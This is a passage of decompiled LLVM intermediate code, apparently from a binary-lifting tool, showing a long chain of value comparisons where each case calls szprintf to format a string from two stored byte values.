  %v3_b0b0 = load i8, i8* @global_var_29926.88, align 1
  %v4_b0bc = sext i8 %v3_b0a4 to i32
  %v6_b0bc = sext i8 %v3_b0b0 to i32
  %v8_b0bc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e6c4.120 to i32), i32 %v4_b0bc, i32 %v6_b0bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0c0

dec_label_pc_b0c0:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_b098
  %v7_b0c4 = icmp eq i32 %v2_ad74, 16
  br i1 %v7_b0c4, label %dec_label_pc_b0cc, label %dec_label_pc_b0f4

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0c0
  %v3_b0d8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b0e4 = load i8, i8* @global_var_29926.88, align 1
  %v4_b0f0 = sext i8 %v3_b0d8 to i32
  %v6_b0f0 = sext i8 %v3_b0e4 to i32
  %v8_b0f0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e6d0.122 to i32), i32 %v4_b0f0, i32 %v6_b0f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0f4

dec_label_pc_b0f4:                                ; preds = %dec_label_pc_b0c0, %dec_label_pc_b0cc
  %v7_b0f8 = icmp eq i32 %v2_ad74, 17
  br i1 %v7_b0f8, label %dec_label_pc_b100, label %dec_label_pc_b128

dec_label_pc_b100:                                ; preds = %dec_label_pc_b0f4
  %v3_b10c = load i8, i8* @global_var_29925.87, align 1
  %v3_b118 = load i8, i8* @global_var_29926.88, align 1
  %v4_b124 = sext i8 %v3_b10c to i32
  %v6_b124 = sext i8 %v3_b118 to i32
  %v8_b124 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e6e0.124 to i32), i32 %v4_b124, i32 %v6_b124, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b128

dec_label_pc_b128:                                ; preds = %dec_label_pc_b0f4, %dec_label_pc_b100
  %v7_b12c = icmp eq i32 %v2_ad74, 18
  br i1 %v7_b12c, label %dec_label_pc_b134, label %dec_label_pc_b15c

dec_label_pc_b134:                                ; preds = %dec_label_pc_b128
  %v3_b140 = load i8, i8* @global_var_29925.87, align 1
  %v3_b14c = load i8, i8* @global_var_29926.88, align 1
  %v4_b158 = sext i8 %v3_b140 to i32
  %v6_b158 = sext i8 %v3_b14c to i32
  %v8_b158 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e6f0.126 to i32), i32 %v4_b158, i32 %v6_b158, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b128, %dec_label_pc_b134
  %v7_b160 = icmp eq i32 %v2_ad74, 19
  br i1 %v7_b160, label %dec_label_pc_b168, label %dec_label_pc_b190

dec_label_pc_b168:                                ; preds = %dec_label_pc_b15c
  %v3_b174 = load i8, i8* @global_var_29925.87, align 1
  %v3_b180 = load i8, i8* @global_var_29926.88, align 1
  %v4_b18c = sext i8 %v3_b174 to i32
  %v6_b18c = sext i8 %v3_b180 to i32
  %v8_b18c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e700.128 to i32), i32 %v4_b18c, i32 %v6_b18c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b190

dec_label_pc_b190:                                ; preds = %dec_label_pc_b15c, %dec_label_pc_b168
  %v7_b194 = icmp eq i32 %v2_ad74, 20
  br i1 %v7_b194, label %dec_label_pc_b19c, label %dec_label_pc_b1c4

dec_label_pc_b19c:                                ; preds = %dec_label_pc_b190
  %v3_b1a8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b1b4 = load i8, i8* @global_var_29926.88, align 1
  %v4_b1c0 = sext i8 %v3_b1a8 to i32
  %v6_b1c0 = sext i8 %v3_b1b4 to i32
  %v8_b1c0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e70c.130 to i32), i32 %v4_b1c0, i32 %v6_b1c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b190, %dec_label_pc_b19c
  %v7_b1c8 = icmp eq i32 %v2_ad74, 21
  br i1 %v7_b1c8, label %dec_label_pc_b1d0, label %dec_label_pc_b1f8

dec_label_pc_b1d0:                                ; preds = %dec_label_pc_b1c4
  %v3_b1dc = load i8, i8* @global_var_29925.87, align 1
  %v3_b1e8 = load i8, i8* @global_var_29926.88, align 1
  %v4_b1f4 = sext i8 %v3_b1dc to i32
  %v6_b1f4 = sext i8 %v3_b1e8 to i32
  %v8_b1f4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e718.132 to i32), i32 %v4_b1f4, i32 %v6_b1f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1c4, %dec_label_pc_b1d0
  %v7_b1fc = icmp eq i32 %v2_ad74, 22
  br i1 %v7_b1fc, label %dec_label_pc_b204, label %dec_label_pc_b22c

dec_label_pc_b204:                                ; preds = %dec_label_pc_b1f8
  %v3_b210 = load i8, i8* @global_var_29925.87, align 1
  %v3_b21c = load i8, i8* @global_var_29926.88, align 1
  %v4_b228 = sext i8 %v3_b210 to i32
  %v6_b228 = sext i8 %v3_b21c to i32
  %v8_b228 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e728.134 to i32), i32 %v4_b228, i32 %v6_b228, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b22c

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b1f8, %dec_label_pc_b204
  %v7_b230 = icmp eq i32 %v2_ad74, 23
  br i1 %v7_b230, label %dec_label_pc_b238, label %dec_label_pc_b260

dec_label_pc_b238:                                ; preds = %dec_label_pc_b22c
  %v3_b244 = load i8, i8* @global_var_29925.87, align 1
  %v3_b250 = load i8, i8* @global_var_29926.88, align 1
  %v4_b25c = sext i8 %v3_b244 to i32
  %v6_b25c = sext i8 %v3_b250 to i32
  %v8_b25c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e734.136 to i32), i32 %v4_b25c, i32 %v6_b25c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b22c, %dec_label_pc_b238
  %v7_b264 = icmp eq i32 %v2_ad74, 24
  br i1 %v7_b264, label %dec_label_pc_b26c, label %dec_label_pc_b294

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b260
  %v3_b278 = load i8, i8* @global_var_29925.87, align 1
  %v3_b284 = load i8, i8* @global_var_29926.88, align 1
  %v4_b290 = sext i8 %v3_b278 to i32
  %v6_b290 = sext i8 %v3_b284 to i32
  %v8_b290 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1e744.138 to i32), i32 %v4_b290, i32 %v6_b290, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b294

dec_label_pc_b294:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b26c
  %v7_b298 = icmp eq i32 %v2_ad74, 25
  br i1 %v7_b298, label %dec_label_pc_b2a0, label %dec_label_pc_b2c8

dec_label_pc_b2a0:                                ; preds = %dec_label_pc_b294
  %v3_b2ac = load i8, i8* @global_var_29925.87, align 1
  %v3_b2b8 = load i8, i8* @global_var_29926.88, align 1
  %v4_b2c4 = sext i8 %v3_b2ac to i32
  %v6_b2c4 = sext i8 %v3_b2b8 to i32
  %v8_b2c4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([11 x i8]* @global_var_1e750.140 to i32), i32 %v4_b2c4, i32 %v6_b2c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2c8

dec_label_pc_b2c8:                                ; preds = %dec_label_pc_b294, %dec_label_pc_b2a0
  %v7_b2cc = icmp eq i32 %v2_ad74, 26
  br i1 %v7_b2cc, label %dec_label_pc_b2d4, label %dec_label_pc_b2fc

dec_label_pc_b2d4:                                ; preds = %dec_label_pc_b2c8
  %v3_b2e0 = load i8, i8* @global_var_29925.87, align 1
  %v3_b2ec = load i8, i8* @global_var_29926.88, align 1
  %v4_b2f8 = sext i8 %v3_b2e0 to i32
  %v6_b2f8 = sext i8 %v3_b2ec to i32
  %v8_b2f8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e75c.142 to i32), i32 %v4_b2f8, i32 %v6_b2f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2fc

dec_label_pc_b2fc:                                ; preds = %dec_label_pc_b2c8, %dec_label_pc_b2d4
  %v7_b300 = icmp eq i32 %v2_ad74, 27
  br i1 %v7_b300, label %dec_label_pc_b308, label %dec_label_pc_b330

dec_label_pc_b308:                                ; preds = %dec_label_pc_b2fc
  %v3_b314 = load i8, i8* @global_var_29925.87, align 1
  %v3_b320 = load i8, i8* @global_var_29926.88, align 1
  %v4_b32c = sext i8 %v3_b314 to i32
  %v6_b32c = sext i8 %v3_b320 to i32
  %v8_b32c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e768.144 to i32), i32 %v4_b32c, i32 %v6_b32c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b330

dec_label_pc_b330:                                ; preds = %dec_label_pc_b2fc, %dec_label_pc_b308
  %v7_b334 = icmp eq i32 %v2_ad74, 28
  br i1 %v7_b334, label %dec_label_pc_b33c, label %dec_label_pc_b364

dec_label_pc_b33c:                                ; preds = %dec_label_pc_b330
  %v3_b348 = load i8, i8* @global_var_29925.87, align 1
  %v3_b354 = load i8, i8* @global_var_29926.88, align 1
  %v4_b360 = sext i8 %v3_b348 to i32
  %v6_b360 = sext i8 %v3_b354 to i32
  %v8_b360 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([12 x i8]* @global_var_1e774.146 to i32), i32 %v4_b360, i32 %v6_b360, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b364

dec_label_pc_b364:                                ; preds = %dec_label_pc_b330, %dec_label_pc_b33c
  %v7_b368 = icmp eq i32 %v2_ad74, 29
  br i1 %v7_b368, label %dec_label_pc_b370, label %dec_label_pc_b398

dec_label_pc_b370:                                ; preds = %dec_label_pc_b364
  %v3_b37c = load i8, i8* @global_var_29925.87, align 1
  %v3_b388 = load i8, i8* @global_var_29926.88, align 1
  %v4_b394 = sext i8 %v3_b37c to i32
  %v6_b394 = sext i8 %v3_b388 to i32
  %v8_b394 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e780.148 to i32), i32 %v4_b394, i32 %v6_b394, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b398

dec_label_pc_b398:                                ; preds = %dec_label_pc_b364, %dec_label_pc_b370
  %v7_b39c = icmp eq i32 %v2_ad74, 30
  br i1 %v7_b39c, label %dec_label_pc_b3a4, label %dec_label_pc_b3cc

dec_label_pc_b3a4:                                ; preds = %dec_label_pc_b398
  %v3_b3b0 = load i8, i8* @global_var_29925.87, align 1
  %v3_b3bc = load i8, i8* @global_var_29926.88, align 1
  %v4_b3c8 = sext i8 %v3_b3b0 to i32
  %v6_b3c8 = sext i8 %v3_b3bc to i32
  %v8_b3c8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e790.150 to i32), i32 %v4_b3c8, i32 %v6_b3c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3cc

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b398, %dec_label_pc_b3a4
  %v7_b3d0 = icmp eq i32 %v2_ad74, 31
  br i1 %v7_b3d0, label %dec_label_pc_b3d8, label %dec_label_pc_b400

dec_label_pc_b3d8:                                ; preds = %dec_label_pc_b3cc
  %v3_b3e4 = load i8, i8* @global_var_29925.87, align 1
  %v3_b3f0 = load i8, i8* @global_var_29926.88, align 1
  %v4_b3fc = sext i8 %v3_b3e4 to i32
  %v6_b3fc = sext i8 %v3_b3f0 to i32
  %v8_b3fc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e7a0.152 to i32), i32 %v4_b3fc, i32 %v6_b3fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b400

dec_label_pc_b400:                                ; preds = %dec_label_pc_b3cc, %dec_label_pc_b3d8
  %v7_b404 = icmp eq i32 %v2_ad74, 32
  br i1 %v7_b404, label %dec_label_pc_b40c, label %dec_label_pc_b434

dec_label_pc_b40c:                                ; preds = %dec_label_pc_b400
  %v3_b418 = load i8, i8* @global_var_29925.87, align 1
  %v3_b424 = load i8, i8* @global_var_29926.88, align 1
  %v4_b430 = sext i8 %v3_b418 to i32
  %v6_b430 = sext i8 %v3_b424 to i32
  %v8_b430 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e7b0.154 to i32), i32 %v4_b430, i32 %v6_b430, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %dec_label_pc_b400, %dec_label_pc_b40c
  %v7_b438 = icmp eq i32 %v2_ad74, 33
  br i1 %v7_b438, label %dec_label_pc_b440, label %dec_label_pc_b468

dec_label_pc_b440:                                ; preds = %dec_label_pc_b434
  %v3_b44c = load i8, i8* @global_var_29925.87, align 1
  %v3_b458 = load i8, i8* @global_var_29926.88, align 1
  %v4_b464 = sext i8 %v3_b44c to i32
  %v6_b464 = sext i8 %v3_b458 to i32
  %v8_b464 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e7c0.156 to i32), i32 %v4_b464, i32 %v6_b464, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b434, %dec_label_pc_b440
  %v7_b46c = icmp eq i32 %v2_ad74, 34
  br i1 %v7_b46c, label %dec_label_pc_b474, label %dec_label_pc_b49c

dec_label_pc_b474:                                ; preds = %dec_label_pc_b468
  %v3_b480 = load i8, i8* @global_var_29925.87, align 1
  %v3_b48c = load i8, i8* @global_var_29926.88, align 1
  %v4_b498 = sext i8 %v3_b480 to i32
  %v6_b498 = sext i8 %v3_b48c to i32
  %v8_b498 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e7d0.158 to i32), i32 %v4_b498, i32 %v6_b498, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b49c

dec_label_pc_b49c:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b474
  %v7_b4a0 = icmp eq i32 %v2_ad74, 35
  br i1 %v7_b4a0, label %dec_label_pc_b4a8, label %dec_label_pc_b4d0

dec_label_pc_b4a8:                                ; preds = %dec_label_pc_b49c
  %v3_b4b4 = load i8, i8* @global_var_29925.87, align 1
  %v3_b4c0 = load i8, i8* @global_var_29926.88, align 1
  %v4_b4cc = sext i8 %v3_b4b4 to i32
  %v6_b4cc = sext i8 %v3_b4c0 to i32
  %v8_b4cc = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e7e0.160 to i32), i32 %v4_b4cc, i32 %v6_b4cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b49c, %dec_label_pc_b4a8
  %v7_b4d4 = icmp eq i32 %v2_ad74, 36
  br i1 %v7_b4d4, label %dec_label_pc_b4dc, label %dec_label_pc_b504

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b4d0
  %v3_b4e8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b4f4 = load i8, i8* @global_var_29926.88, align 1
  %v4_b500 = sext i8 %v3_b4e8 to i32
  %v6_b500 = sext i8 %v3_b4f4 to i32
  %v8_b500 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e7f0.162 to i32), i32 %v4_b500, i32 %v6_b500, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b504

dec_label_pc_b504:                                ; preds = %dec_label_pc_b4d0, %dec_label_pc_b4dc
  %v7_b508 = icmp eq i32 %v2_ad74, 37
  br i1 %v7_b508, label %dec_label_pc_b510, label %dec_label_pc_b538

dec_label_pc_b510:                                ; preds = %dec_label_pc_b504
  %v3_b51c = load i8, i8* @global_var_29925.87, align 1
  %v3_b528 = load i8, i8* @global_var_29926.88, align 1
  %v4_b534 = sext i8 %v3_b51c to i32
  %v6_b534 = sext i8 %v3_b528 to i32
  %v8_b534 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e800.164 to i32), i32 %v4_b534, i32 %v6_b534, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b538

dec_label_pc_b538:                                ; preds = %dec_label_pc_b504, %dec_label_pc_b510
  %v7_b53c = icmp eq i32 %v2_ad74, 38
  br i1 %v7_b53c, label %dec_label_pc_b544, label %dec_label_pc_b56c

dec_label_pc_b544:                                ; preds = %dec_label_pc_b538
  %v3_b550 = load i8, i8* @global_var_29925.87, align 1
  %v3_b55c = load i8, i8* @global_var_29926.88, align 1
  %v4_b568 = sext i8 %v3_b550 to i32
  %v6_b568 = sext i8 %v3_b55c to i32
  %v8_b568 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e810.166 to i32), i32 %v4_b568, i32 %v6_b568, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b56c

dec_label_pc_b56c:                                ; preds = %dec_label_pc_b538, %dec_label_pc_b544
  %v7_b570 = icmp eq i32 %v2_ad74, 39
  br i1 %v7_b570, label %dec_label_pc_b578, label %dec_label_pc_b5a0

dec_label_pc_b578:                                ; preds = %dec_label_pc_b56c
  %v3_b584 = load i8, i8* @global_var_29925.87, align 1
  %v3_b590 = load i8, i8* @global_var_29926.88, align 1
  %v4_b59c = sext i8 %v3_b584 to i32
  %v6_b59c = sext i8 %v3_b590 to i32
  %v8_b59c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e820.168 to i32), i32 %v4_b59c, i32 %v6_b59c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5a0

dec_label_pc_b5a0:                                ; preds = %dec_label_pc_b56c, %dec_label_pc_b578
  %v7_b5a4 = icmp eq i32 %v2_ad74, 40
  br i1 %v7_b5a4, label %dec_label_pc_b5ac, label %dec_label_pc_b5d4

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b5a0
  %v3_b5b8 = load i8, i8* @global_var_29925.87, align 1
  %v3_b5c4 = load i8, i8* @global_var_29926.88, align 1
  %v4_b5d0 = sext i8 %v3_b5b8 to i32
  %v6_b5d0 = sext i8 %v3_b5c4 to i32
  %v8_b5d0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e830.170 to i32), i32 %v4_b5d0, i32 %v6_b5d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5d4

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5a0, %dec_label_pc_b5ac
  %v7_b5d8 = icmp eq i32 %v2_ad74, 41
  br i1 %v7_b5d8, label %dec_label_pc_b5e0, label %dec_label_pc_b608

dec_label_pc_b5e0:                                ; preds = %dec_label_pc_b5d4
  %v3_b5ec = load i8, i8* @global_var_29925.87, align 1
  %v3_b5f8 = load i8, i8* @global_var_29926.88, align 1
  %v4_b604 = sext i8 %v3_b5ec to i32
  %v6_b604 = sext i8 %v3_b5f8 to i32
  %v8_b604 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e840.172 to i32), i32 %v4_b604, i32 %v6_b604, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b5d4, %dec_label_pc_b5e0
  %v7_b60c = icmp eq i32 %v2_ad74, 42
  br i1 %v7_b60c, label %dec_label_pc_b614, label %dec_label_pc_b63c

dec_label_pc_b614:                                ; preds = %dec_label_pc_b608
  %v3_b620 = load i8, i8* @global_var_29925.87, align 1
  %v3_b62c = load i8, i8* @global_var_29926.88, align 1
  %v4_b638 = sext i8 %v3_b620 to i32
  %v6_b638 = sext i8 %v3_b62c to i32
  %v8_b638 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e850.174 to i32), i32 %v4_b638, i32 %v6_b638, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b63c

dec_label_pc_b63c:                                ; preds = %dec_label_pc_b608, %dec_label_pc_b614
  %v7_b640 = icmp eq i32 %v2_ad74, 43
  br i1 %v7_b640, label %dec_label_pc_b648, label %dec_label_pc_b670

dec_label_pc_b648:                                ; preds = %dec_label_pc_b63c
  %v3_b654 = load i8, i8* @global_var_29925.87, align 1
  %v3_b660 = load i8, i8* @global_var_29926.88, align 1
  %v4_b66c = sext i8 %v3_b654 to i32
  %v6_b66c = sext i8 %v3_b660 to i32
  %v8_b66c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e860.176 to i32), i32 %v4_b66c, i32 %v6_b66c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b670

dec_label_pc_b670:                                ; preds = %dec_label_pc_b63c, %dec_label_pc_b648
  %v7_b674 = icmp eq i32 %v2_ad74, 44
  br i1 %v7_b674, label %dec_label_pc_b67c, label %dec_label_pc_b6a4

dec_label_pc_b67c:                                ; preds = %dec_label_pc_b670
  %v3_b688 = load i8, i8* @global_var_29925.87, align 1
  %v3_b694 = load i8, i8* @global_var_29926.88, align 1
  %v4_b6a0 = sext i8 %v3_b688 to i32
  %v6_b6a0 = sext i8 %v3_b694 to i32
  %v8_b6a0 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e870.178 to i32), i32 %v4_b6a0, i32 %v6_b6a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b670, %dec_label_pc_b67c
  %v7_b6a8 = icmp eq i32 %v2_ad74, 45
  br i1 %v7_b6a8, label %dec_label_pc_b6b0, label %dec_label_pc_b6d8

dec_label_pc_b6b0:                                ; preds = %dec_label_pc_b6a4
  %v3_b6bc = load i8, i8* @global_var_29925.87, align 1
  %v3_b6c8 = load i8, i8* @global_var_29926.88, align 1
  %v4_b6d4 = sext i8 %v3_b6bc to i32
  %v6_b6d4 = sext i8 %v3_b6c8 to i32
  %v8_b6d4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e880.180 to i32), i32 %v4_b6d4, i32 %v6_b6d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6d8

dec_label_pc_b6d8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b6b0
  %v7_b6dc = icmp eq i32 %v2_ad74, 46
  br i1 %v7_b6dc, label %dec_label_pc_b6e4, label %dec_label_pc_b70c

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b6d8
  %v3_b6f0 = load i8, i8* @global_var_29925.87, align 1
  %v3_b6fc = load i8, i8* @global_var_29926.88, align 1
  %v4_b708 = sext i8 %v3_b6f0 to i32
  %v6_b708 = sext i8 %v3_b6fc to i32
  %v8_b708 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e890.182 to i32), i32 %v4_b708, i32 %v6_b708, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b70c

dec_label_pc_b70c:                                ; preds = %dec_label_pc_b6d8, %dec_label_pc_b6e4
  %v7_b710 = icmp eq i32 %v2_ad74, 47
  br i1 %v7_b710, label %dec_label_pc_b718, label %dec_label_pc_b740

dec_label_pc_b718:                                ; preds = %dec_label_pc_b70c
  %v3_b724 = load i8, i8* @global_var_29925.87, align 1
  %v3_b730 = load i8, i8* @global_var_29926.88, align 1
  %v4_b73c = sext i8 %v3_b724 to i32
  %v6_b73c = sext i8 %v3_b730 to i32
  %v8_b73c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e8a0.184 to i32), i32 %v4_b73c, i32 %v6_b73c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b740

dec_label_pc_b740:                                ; preds = %dec_label_pc_b70c, %dec_label_pc_b718
  %v7_b744 = icmp eq i32 %v2_ad74, 48
  br i1 %v7_b744, label %dec_label_pc_b74c, label %dec_label_pc_b774

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b740
  %v3_b758 = load i8, i8* @global_var_29925.87, align 1
  %v3_b764 = load i8, i8* @global_var_29926.88, align 1
  %v4_b770 = sext i8 %v3_b758 to i32
  %v6_b770 = sext i8 %v3_b764 to i32
  %v8_b770 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e8b0.186 to i32), i32 %v4_b770, i32 %v6_b770, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b774

dec_label_pc_b774:                                ; preds = %dec_label_pc_b740, %dec_label_pc_b74c
  %v7_b778 = icmp eq i32 %v2_ad74, 49
  br i1 %v7_b778, label %dec_label_pc_b780, label %dec_label_pc_b7a8

dec_label_pc_b780:                                ; preds = %dec_label_pc_b774
  %v3_b78c = load i8, i8* @global_var_29925.87, align 1
  %v3_b798 = load i8, i8* @global_var_29926.88, align 1
  %v4_b7a4 = sext i8 %v3_b78c to i32
  %v6_b7a4 = sext i8 %v3_b798 to i32
  %v8_b7a4 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e8c0.188 to i32), i32 %v4_b7a4, i32 %v6_b7a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7a8

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b774, %dec_label_pc_b780
  %v7_b7ac = icmp eq i32 %v2_ad74, 50
  br i1 %v7_b7ac, label %dec_label_pc_b7b4, label %dec_label_pc_b7dc

dec_label_pc_b7b4:                                ; preds = %dec_label_pc_b7a8
  %v3_b7c0 = load i8, i8* @global_var_29925.87, align 1
  %v3_b7cc = load i8, i8* @global_var_29926.88, align 1
  %v4_b7d8 = sext i8 %v3_b7c0 to i32
  %v6_b7d8 = sext i8 %v3_b7cc to i32
  %v8_b7d8 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e8d0.190 to i32), i32 %v4_b7d8, i32 %v6_b7d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7dc

dec_label_pc_b7dc:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b7b4
  %v7_b7e0 = icmp eq i32 %v2_ad74, 51
  br i1 %v7_b7e0, label %dec_label_pc_b7e8, label %dec_label_pc_b810

dec_label_pc_b7e8:                                ; preds = %dec_label_pc_b7dc
  %v3_b7f4 = load i8, i8* @global_var_29925.87, align 1
  %v3_b800 = load i8, i8* @global_var_29926.88, align 1
  %v4_b80c = sext i8 %v3_b7f4 to i32
  %v6_b80c = sext i8 %v3_b800 to i32
  %v8_b80c = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e8e0.192 to i32), i32 %v4_b80c, i32 %v6_b80c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b810

dec_label_pc_b810:                                ; preds = %dec_label_pc_b7dc, %dec_label_pc_b7e8
  %v7_b814 = icmp eq i32 %v2_ad74, 52
  br i1 %v7_b814, label %dec_label_pc_b81c, label %dec_label_pc_b844

dec_label_pc_b81c:                                ; preds = %dec_label_pc_b810
  %v3_b828 = load i8, i8* @global_var_29925.87, align 1
  %v3_b834 = load i8, i8* @global_var_29926.88, align 1
  %v4_b840 = sext i8 %v3_b828 to i32
  %v6_b840 = sext i8 %v3_b834 to i32
  %v8_b840 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([14 x i8]* @global_var_1e8f0.194 to i32), i32 %v4_b840, i32 %v6_b840, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b844

dec_label_pc_b844:                                ; preds = %dec_label_pc_b810, %dec_label_pc_b81c
  %v7_b848 = icmp eq i32 %v2_ad74, 53
  br i1 %v7_b848, label %dec_label_pc_b850, label %dec_label_pc_b878

dec_label_pc_b850:                                ; preds = %dec_label_pc_b844
  %v3_b85c = load i8, i8* @global_var_29925.87, align 1
  %v3_b868 = load i8, i8* @global_var_29926.88, align 1
  %v4_b874 = sext i8 %v3_b85c to i32
  %v6_b874 = sext i8 %v3_b868 to i32
  %v8_b874 = call i32 @szprintf(i32 %v2_aca0, i32 ptrtoint ([13 x i8]* @global_var_1e900.196 to i32), i32 %v4_b874, i32 %v6_b874, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b878

dec_label_pc_b878:                                ; preds = %dec_label_pc_b844, %dec_label_pc_b850
  %v7_b87c = icmp eq i32 %v2_ad74, 54
  br i1 %v7_b87c, label %dec_label_pc_b884, label %dec_label_pc_b8ac

dec_label_pc_b884:                                ; preds = %dec_label_pc_b878
  %v3_b890 = load i8, i8* @global_var_29925.87, align 1
  %v3_b89c = load i8, i8* @global_var_29926.88, align 1
  %v4_b8a8 = sext i8 %v3_b890 to i32
